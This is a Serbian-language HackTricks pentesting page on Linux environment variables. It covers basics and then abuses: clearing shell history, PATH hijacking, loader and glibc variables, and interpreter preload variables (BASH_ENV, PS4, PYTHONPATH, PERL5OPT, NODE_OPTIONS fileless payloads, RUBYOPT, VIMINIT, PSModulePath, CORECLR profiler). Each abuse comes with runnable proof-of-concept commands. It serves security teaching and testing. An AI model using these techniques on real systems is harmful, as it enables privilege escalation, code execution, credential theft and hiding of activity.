# Promenljive okruženja u Linuxu

{{#include ../../banners/hacktricks-training.md}}

## Globalne promenljive

**Globalne promenljive** će nasleđivati **procesi potomci**.

Globalnu promenljivu za trenutnu sesiju možete kreirati ovako:

```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```

Ova promenljiva će biti dostupna vašim trenutnim sesijama i njihovim podređenim procesima.

Promenljivu možete **ukloniti** tako što ćete:

```bash
unset MYGLOBAL
```

## Lokalne promenljive

**Lokalnim promenljivama** može da pristupi samo **trenutna ljuska/skripta**.

```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```

## Izlistajte trenutne promenljive

```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```

Sadržaj datoteka `/proc/*/environ` razdvojen je **NUL** znakovima, pa su ove varijante obično lakše za čitanje:

```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```

Ako tražite **credentials** ili **zanimljivu konfiguraciju servisa** u nasleđenim okruženjima, pogledajte i [Linux Post Exploitation](../post-exploitation/README.md).

## Uobičajene promenljive

Izvor: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – ekran koji koristi **X**. Ova promenljiva se obično postavlja na **:0.0**, što označava prvi ekran na trenutnom računaru.
- **EDITOR** – korisnikov omiljeni uređivač teksta.
- **HISTFILESIZE** – maksimalan broj redova u datoteci istorije.
- **HISTSIZE** – broj redova koji se dodaju u datoteku istorije kada korisnik završi sesiju.
- **HOME** – vaš matični direktorijum.
- **HOSTNAME** – ime hosta računara.
- **LANG** – vaš trenutni jezik.
- **MAIL** – lokacija korisnikove poštanske fascikle. Obično **/var/spool/mail/USER**.
- **MANPATH** – spisak direktorijuma u kojima se traže stranice priručnika.
- **OSTYPE** – tip operativnog sistema.
- **PS1** – podrazumevani prompt u bash-u.
- **PATH** – sadrži putanje do svih direktorijuma sa binarnim datotekama koje želite da izvršavate navođenjem samo imena datoteke, a ne relativne ili apsolutne putanje.
- **PWD** – trenutni radni direktorijum.
- **SHELL** – putanja do trenutne komandne ljuske (na primer, **/bin/bash**).
- **TERM** – trenutni tip terminala (na primer, **xterm**).
- **TZ** – vaša vremenska zona.
- **USER** – vaše trenutno korisničko ime.

## Zanimljive promenljive za hacking

Nisu sve promenljive podjednako korisne. Iz ofanzivne perspektive, dajte prednost promenljivama koje menjaju **putanje pretrage**, **datoteke za pokretanje**, ponašanje **dynamic linker-a** ili **audit/logovanje**.

### **HISTFILESIZE**

**Postavite vrednost ove promenljive na 0** kako bi se, kada **završite sesiju**, **datoteka istorije** (\~/.bash_history) **skratila na 0 redova**.

```bash
export HISTFILESIZE=0
```

### **HISTSIZE**

Promenite **vrednost ove promenljive na 0**, tako da se komande **ne čuvaju u istoriji u memoriji** i ne upisuju ponovo u **datoteku istorije** (\~/.bash_history).

```bash
export HISTSIZE=0
```

### **HISTCONTROL**

Ako je **vrednost ove promenljive postavljena na `ignorespace` ili `ignoreboth`**, nijedna komanda kojoj je dodat razmak na početku neće biti sačuvana u istoriji.

```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```

### **HISTFILE**

Usmerite **datoteku istorije** na **`/dev/null`** ili je potpuno uklonite iz okruženja. Ovo je obično pouzdanije nego samo menjati veličinu istorije.

```bash
export HISTFILE=/dev/null
unset HISTFILE
```

### http_proxy & https_proxy

Procesi će koristiti **proxy** naveden ovde za povezivanje na internet putem **http or https**.

```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```

### all_proxy & no_proxy

- `all_proxy`: podrazumevani proxy za alate/protokole koji ga podržavaju.
- `no_proxy`: lista hostova/domena/CIDR opsega koji treba da se povezuju direktno.

```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```

I varijante napisane malim i velikim slovima mogu se koristiti u zavisnosti od alata (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

Procesi će verovati sertifikatima navedenim u **ovim env promenljivama**. Ovo je korisno da bi alati kao što su **`curl`**, **`git`**, Python HTTP klijenti ili upravljači paketima verovali CA-u pod kontrolom napadača (na primer, da bi interception proxy izgledao legitimno).

```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```

### **PATH**

Ako privilegovani omotač/skripta izvršava komande **bez apsolutnih putanja**, prednost ima **prvi direktorijum pod kontrolom napadača** u promenljivoj `PATH`. Ovo je osnova mnogih **PATH hijack** napada u `sudo`, cron poslovima, shell omotačima i prilagođenim SUID pomoćnim programima. Potražite `env_keep+=PATH`, slabu vrednost `secure_path` ili omotače koji pozivaju `tar`, `service`, `cp`, `python` itd. po imenu.

```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```

Za kompletne lance **privilege escalation** koji zloupotrebljavaju `PATH`, pogledajte [Linux Privilege Escalation](linux-privilege-escalation/README.md).

### **HOME & XDG_CONFIG_HOME**

`HOME` nije samo referenca na direktorijum: mnogi alati automatski učitavaju **dotfiles**, **plugins** i **konfiguraciju po korisniku** iz `$HOME` ili `$XDG_CONFIG_HOME`. Ako privilegovani tok rada sačuva ove vrednosti, **config injection** može biti lakši od **binary hijacking**.

```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```

Zanimljive mete uključuju `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py` i datoteke specifične za alate, kao što je `.terraformrc`.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Ove promenljive utiču na **dinamički linker**:

- `LD_PRELOAD`: primorava dodatne deljene objekte da se učitaju prvi.
- `LD_LIBRARY_PATH`: dodaje direktorijume za pretragu biblioteka na početak liste.
- `LD_AUDIT`: učitava audit biblioteke koje nadgledaju učitavanje biblioteka i razrešavanje simbola.

Izuzetno su korisne za **hooking**, **instrumentaciju** i **eskalaciju privilegija** ako ih privilegovana komanda sačuva. U režimu **bezbednog izvršavanja** (`AT_SECURE`, npr. setuid/setgid/capabilities), loader uklanja ili ograničava mnoge od ovih promenljivih. Međutim, greške u parseru u toj ranoj fazi loadera i dalje mogu imati ozbiljne posledice jer se javljaju **pre** pokretanja ciljnog programa.<sup>[[2]](#references)</sup>

```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```

### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` menja rano ponašanje glibc-a (na primer, podešavanja alokatora) i veoma je korisna u exploit laboratorijama. Važna je i iz bezbednosne perspektive zato što je **dinamički učitavač obrađuje veoma rano**. Greška **Looney Tunables** iz 2023. godine bila je dobar podsetnik da jedna promenljiva okruženja koju obrađuje učitavač može postati **mehanizam za lokalno podizanje privilegija** u odnosu na SUID programe.<sup>[[6]](#references)</sup>

Za CVE-2023-4911 uporedite **izdanje instaliranog distribucionog paketa** sa ispravljenim izdanjem tog proizvođača i proverite koji se učitavač zaista koristi pri pokretanju novih procesa. Sam broj verzije iz upstream-a nije pouzdan: Debian je preneo ranjivi parser u svoj paket 2.31, dok su distribucije prenele ispravke bez promene upstream broja. Za praktičan prelaz privilegija potreban je i izvršni privilegovani cilj čija promena identiteta nije blokirana opcijom `NoNewPrivs`, tačkom montiranja `nosuid` ili drugom merom ublažavanja. Izbegavajte pokretanje sonde koja izaziva pad sa neispravnim `GLIBC_TUNABLES` tokom pasivnog prikupljanja podataka. Pogledajte [Ubuntu tracker](https://ubuntu.com/security/CVE-2023-4911), [Debian tracker](https://security-tracker.debian.org/tracker/CVE-2023-4911) i [Red Hat advisory](https://access.redhat.com/security/cve/cve-2023-4911) za primenljivost na konkretna izdanja; Ubuntu-ovo [bezbednosno obaveštenje](https://ubuntu.com/security/notices/USN-6409-1) takođe zahteva ponovno pokretanje sistema nakon ažuriranja.

```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```

### **BASH_ENV & ENV**

Ako se **Bash** pokrene **neinteraktivno**, proverava `BASH_ENV` i učitava tu datoteku pre pokretanja ciljne skripte. Kada se Bash pozove kao `sh` ili u interaktivnom režimu u POSIX stilu, može da proveri i `ENV`. Ovo je klasičan način da se shell omotač pretvori u code execution ako napadač kontroliše okruženje.

```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```

Bash ignoriše ove startne datoteke kada se **stvarni/efektivni ID-jevi razlikuju**; `-p` čuva efektivni ID, ali ne omogućava učitavanje tih startnih datoteka, pa tačno ponašanje zavisi od toga kako wrapper pokreće shell. Budite oprezni sa privilegovanim wrapper-ima koji pozivaju `setuid()`/`setgid()` **pre** pokretanja Bash-a: kada se ID-jevi ponovo poklope, Bash može da veruje promenljivama `BASH_ENV`, `ENV` i povezanim podešavanjima shell-a, koje bi inače ignorisao.<sup>[[1]](#references)</sup>

### **PS4 + SHELLOPTS (xtrace)**

Kada je u Bash-u omogućen **xtrace**, on proširuje `PS4` i ispisuje je pre svake praćene komande. `PS4` se proširuje kao prompt, pa se **command substitution** unutar nje izvršava. Ključno je to što se xtrace može uključiti direktno iz okruženja izvozom `SHELLOPTS=xtrace` — nije potreban `-x` u komandnoj liniji — pa svaka Bash skripta koju žrtva pokrene omogućava code execution.<sup>[[7]](#references)</sup>

```bash
echo 'echo target' > /tmp/victim.sh

# Pure environment-variable injection (no -x flag)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a job is run with debugging enabled
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```

`PS4` ne radi dok se ne aktivira xtrace (`SHELLOPTS=xtrace`, `set -x` ili `bash -x`), a Bash uklanja `SHELLOPTS` u privilegovanim/setuid kontekstima, isto kao `BASH_ENV`.

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP, PYTHONINSPECT & PYTHONBREAKPOINT**

Ove promenljive menjaju način na koji se Python pokreće:

- `PYTHONPATH`: dodaje putanje za pretragu pri importovanju.
- `PYTHONHOME`: premešta stablo standardne biblioteke.
- `PYTHONSTARTUP`: izvršava datoteku pre interaktivnog prompta.
- `PYTHONINSPECT=1`: prelazi u interaktivni režim nakon završetka skripte.
- `PYTHONBREAKPOINT`: poziva `package.module.callable` (i importuje njegov modul) kada kod naiđe na `breakpoint()`.<sup>[[8]](#references)</sup>

Korisne su protiv skripti za održavanje, debagera, shell-ova i omotača koji pozivaju Python uz kontrolisano okruženje. `python -E` i `python -I` ignorišu sve promenljive `PYTHON*`.

```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode

# PYTHONBREAKPOINT: runs when the target reaches breakpoint()
printf 'import sys\nbreakpoint(*sys.argv[1:])\n' > /tmp/bp.py
PYTHONBREAKPOINT='os.system' python3 /tmp/bp.py 'id'   # requires the code to hit breakpoint()
```

Nedavni primer iz stvarnog sveta bio je LPE u **needrestart** iz 2024. godine na Ubuntu/Debian sistemima: skener u vlasništvu root-a kopirao je `PYTHONPATH` neprivilegovanog procesa iz `/proc/<PID>/environ`, a zatim pokrenuo Python. Objavljeni exploit je postavio `importlib/__init__.so` u putanju pod kontrolom napadača, pa je Python izvršio napadačev kod tokom sopstvene inicijalizacije, pre nego što je uopšte došao na red skript helper-a sa hardkodiranom putanjom.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl ima podjednako korisne promenljive za pokretanje:

- `PERL5LIB`: dodaje direktorijume biblioteka na početak putanje za pretragu.
- `PERL5OPT`: ubacuje opcije kao da su navedene u komandnoj liniji svake komande `perl`.

Ovo može da nametne **automatsko učitavanje modula** ili da promeni ponašanje interpretera pre nego što ciljna skripta uradi bilo šta zanimljivo. Perl ignoriše ove promenljive u kontekstima **taint / setuid / setgid**, ali su i dalje veoma važne za uobičajene wrapper-e koji se pokreću kao root, CI poslove, instalacione programe i prilagođena sudoers pravila.

Ako sudo pravilo dozvoljava zamenu promenljivih okruženja, a njegova privilegovana komanda na kraju pokreće Perl, proverite i `PERL5DB`. Perl dokumentacija navodi da `PERL5OPT=-d` pokreće debugger, a da `PERL5DB` obezbeđuje kod za inicijalizaciju debugger-a kada se Perl pokrene sa samostalnom opcijom `-d`. Uklanjanje samo `PERL5LIB` i `PERLLIB` ne uklanja ovaj mogući put. Promenljive moraju da prežive sudo i wrapper, a Perl proces ne sme da ih ignoriše zbog taint ili set-ID obrade; tokom enumeracije pregledajte tačno pravilo i lanac izvršavanja, bez pokretanja privilegovanog helper-a. Pogledajte [referencu za promenljive okruženja u perlrun-u](https://perldoc.perl.org/perlrun#ENVIRONMENT).

Ugrađena Perl putanja za pretragu [`@INC`](https://perldoc.perl.org/perlvar#@INC) predstavlja još jednu granicu poverenja za module, čak i kada se promenljive okruženja ne čuvaju. Za privilegovan Perl proces povežite stvarnu naredbu `use` ili `require` sa razrešenim imenom modula, redosledom pretrage i mogućnošću da korisnik sa nižim privilegijama kreira ili zameni taj modul u nekom od direktorijuma za pretragu. Sama činjenica da je direktorijum biblioteke upisivna ne dokazuje da će privilegovani proces učitati kod iz njega.

```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```

### **NODE_OPTIONS**

`NODE_OPTIONS` dodaje **Node.js CLI flags** na početak argumenata svakog `node` procesa koji nasledi okruženje. Zato je koristan protiv wrappera, CI poslova, Electron pomoćnih procesa i sudo pravila koja na kraju pozivaju Node. Najzanimljiviji flags za napadače su obično:

- `--require <file>`: učitava CommonJS datoteku pre ciljne skripte.
- `--import <module>`: učitava ES modul pre ciljne skripte.

Node odbacuje neke opasne flags u `NODE_OPTIONS`, ali su `--require` i `--import` izričito dozvoljeni i obrađuju se **pre** uobičajenih argumenata komandne linije.<sup>[[4]](#references)</sup>

```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```

#### Fileless preload sa `data:` URL-om

Kada možete da podesite `NODE_OPTIONS`, ali **ne možete da upišete datoteku** na ciljnom sistemu (sistem datoteka samo za čitanje, ograničeni API, serverless okruženje itd.), `--import` prihvata URL oblika `data:text/javascript,`, tako da se ceo payload prenosi unutar same promenljive okruženja. JavaScript mora biti **potpuno URL-enkodiran** — Node tumači vrednost kao URL, pa svaki neenkodirani razmak (ili drugi neenkodirani znak) skraćuje payload i izaziva `SyntaxError`. Ovo radi u Node-u 20.6+ gde je `--import` na listi dozvoljenih opcija za `NODE_OPTIONS`.<sup>[[4]](#references)</sup>

```bash
# fileless proof of execution (note: no raw spaces in the data URL)
NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'

# Real payload, URL-encoded (run a command / exfiltrate env vars)
PAYLOAD=$(python3 - <<'PY'
import urllib.parse
js = "import('child_process').then(cp=>console.log(cp.execSync('id').toString()))"
print("--import data:text/javascript," + urllib.parse.quote(js, safe=""))
PY
)
NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
```

> [!TIP]
> Ovo je čest način da se kontrola nad `NODE_OPTIONS` pretvori u RCE u **upravljanim cloud runtime okruženjima** čije funkcije koriste Node. Na primer, napadač koji može samo da promeni konfiguraciju Lambda funkcije (`lambda:UpdateFunctionConfiguration`, bez `iam:PassRole` i bez ažuriranja koda) može da ubaci `NODE_OPTIONS=--import data:text/javascript,<payload>` i pokrene kod unutar funkcije, čime krade akreditive njene execution role. Ubačeni modul se pokreće **pre** handlera, koji se zatim normalno izvršava.
>
> Za udaljene gadget chain-ove koji indirektno postavljaju `NODE_OPTIONS` (na primer, preko prototype pollution do RCE), pogledajte [ovu drugu stranicu](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).

### **RUBYLIB & RUBYOPT**

Ruby nudi istu klasu zloupotrebe pri pokretanju:

- `RUBYLIB`: dodaje direktorijume na početak Ruby-jeve putanje za učitavanje.
- `RUBYOPT`: ubacuje opcije komandne linije, poput `-r`, u svako pokretanje `ruby`.

```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```

Ranljivosti u **needrestart** iz 2024. pokazale su da ovo nije samo laboratorijski trik: isti pomoćni program u vlasništvu root-a, koji je bio ranjiv na zloupotrebu `PYTHONPATH` promenljive, mogao je da se navede i da pokrene Ruby sa napadačem kontrolisanom promenljivom `RUBYLIB`, učitavajući `enc/encdb.so` iz direktorijuma koji kontroliše napadač.<sup>[[3]](#references)</sup>

### **VIMINIT & EXINIT**

Vim/Neovim pri uobičajenom pokretanju izvršavaju Ex komande sadržane u promenljivoj `VIMINIT` (ili njenoj rezervnoj opciji `EXINIT`). Ex komande obuhvataju `:!cmd` i `:call system(...)`, pa kontrola nad ovom promenljivom omogućava izvršavanje koda kad god žrtva otvori Vim (npr. `sudo vim` kao root, `crontab -e`, `visudo`, `$EDITOR` koji pokreću `git`/`less`, itd.).<sup>[[9]](#references)</sup>

```bash
echo hi > /tmp/victim.txt
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
test -e /tmp/vim-executed && echo 'VIMINIT executed'
```

Batch režim (`vim -es`/`-Es`) preskače ove promenljive, ali ih uobičajeno interaktivno pokretanje izvršava.

### **PowerShell (pwsh): PSModulePath, DOTNET_STARTUP_HOOKS & CLR profiler**

PowerShell Core (`pwsh`) radi na Linux/macOS (i Windowsu) i predstavlja **.NET aplikaciju**, pa nekoliko promenljivih okruženja može da omogući izvršavanje koda pri svakom pozivu `pwsh` koji nasledi okruženje — korisno protiv cron/systemd poslova, CI runnera i privilegovanih omotača koji pokreću `pwsh`.

- `PSModulePath`: PowerShell rekurzivno pretražuje svaki direktorijum sa ove liste u potrazi za `.psd1`/`.psm1` modulima i **automatski učitava** modul kada se prvi put pozove komanda koju on izvozi. Dodajte direktorijum na početak liste i kod na najvišem nivou vašeg modula izvršava se pri uvozu; pošto je redosled razrešavanja *Alias → Function → Cmdlet*, izvezena funkcija čak može da zaseni ugrađeni cmdlet koji žrtva pozove.<sup>[[10]](#references)</sup>
- `XDG_CONFIG_HOME`: premešta `powershell/Microsoft.PowerShell_profile.ps1`, koji se izvršava pri pokretanju (osim uz `-NoProfile`).
- `DOTNET_STARTUP_HOOKS`: upravljani sklop čiji se `StartupHook.Initialize()` izvršava pre funkcije `Main` (zajednički za sve .NET aplikacije).
- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so`: CLR profiling API pri pokretanju učitava biblioteku napadača u proces (promenljive putanje imaju prednost nad registrom; `DOTNET_*` je noviji alias). U Windows PowerShell 5.1 (.NET Framework) koristite `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH`. MITRE ATT&CK T1574.012.<sup>[[11]](#references)</sup>

```bash
# PSModulePath module auto-load hijack
mkdir -p /tmp/evil/Hijack
printf 'New-Item -ItemType File /tmp/ps-mod-exec -Force|Out-Null\nfunction Invoke-Report{}\nExport-ModuleMember -Function Invoke-Report\n' > /tmp/evil/Hijack/Hijack.psm1
printf "@{ModuleVersion='1.0';RootModule='Hijack.psm1';FunctionsToExport=@('Invoke-Report')}\n" > /tmp/evil/Hijack/Hijack.psd1
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/ps-mod-exec && echo 'PSModulePath auto-load executed'
```

Na Windows-u, `PSExecutionPolicyPreference=Bypass` dodatno uklanja zaštitu „blokiranja nepotpisanih skripti“, pa podmetnuti profil/modul zaista može da se pokrene. Pogledajte posebnu stranicu za kompletne PoC-ove:

{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-powershell-applications-injection.md
{{#endref}}

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Neki alati ne čitaju samo putanju iz okruženja; prosleđuju vrednost **shell-u**, **editor-u** ili **preprocesoru ulaza**. Zbog toga su sledeće promenljive posebno zanimljive kada privilegovani wrapper pokreće `git`, `man`, `less` ili slične prikazivače teksta:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: biraju komandu za pager.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: biraju komandu za editor, često sa argumentima.
- `LESSOPEN`, `LESSCLOSE`: definišu pred-/postprocesore koji se pokreću kada `less` otvori datoteku.

```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```

Git takođe podržava **ubacivanje konfiguracije samo putem promenljivih okruženja** bez zapisivanja na disk, pomoću promenljivih `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>` i `GIT_CONFIG_VALUE_<n>`:

```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```

Iz perspektive post-exploitation, imajte na umu i da nasleđena okruženja često sadrže **credentials**, **proxy settings**, **service tokens** ili **cloud keys**. Pogledajte [Linux Post Exploitation](../post-exploitation/README.md) za traženje `/proc/<PID>/environ` i `systemd` `Environment=`.

### PS1

Promenite izgled prompta.

[**Ovo je primer**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: Ovo je primer](<../images/image (897).png>)

Običan korisnik:

![PERL5OPT & PERL5LIB - PS1: Jedan, dva i tri poslova pokrenuta u pozadini](<../images/image (740).png>)

Jedan, dva i tri posla pokrenuta u pozadini:

![PERL5OPT & PERL5LIB - PS1: Jedan, dva i tri posla pokrenuta u pozadini](<../images/image (145).png>)

Jedan posao u pozadini, jedan zaustavljen, a poslednja komanda nije ispravno završena:

![PERL5OPT & PERL5LIB - PS1: Jedan posao u pozadini, jedan zaustavljen, a poslednja komanda nije ispravno završena](<../images/image (715).png>)

## References

- [1] [GNU Bash priručnik - Bash startup datoteke](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Linux man stranica](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - LPE ranjivosti u needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Node.js CLI dokumentacija - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Uobičajene promenljive okruženja - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - lokalno podizanje privilegija u glibc ld.so - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
- [7] [GNU Bash priručnik - Bash promenljive (`PS4`) i ugrađena komanda Set (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [8] [PEP 553 - Ugrađena funkcija breakpoint() i PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [9] [Vim dokumentacija - starting.txt (`VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
- [10] [about_PSModulePath i automatsko učitavanje PowerShell modula](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [11] [Konfiguracione postavke za .NET otklanjanje grešaka i profilisanje (promenljive profilera `CORECLR_`/`DOTNET_`/`COR_`)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
{{#include ../../banners/hacktricks-training.md}}
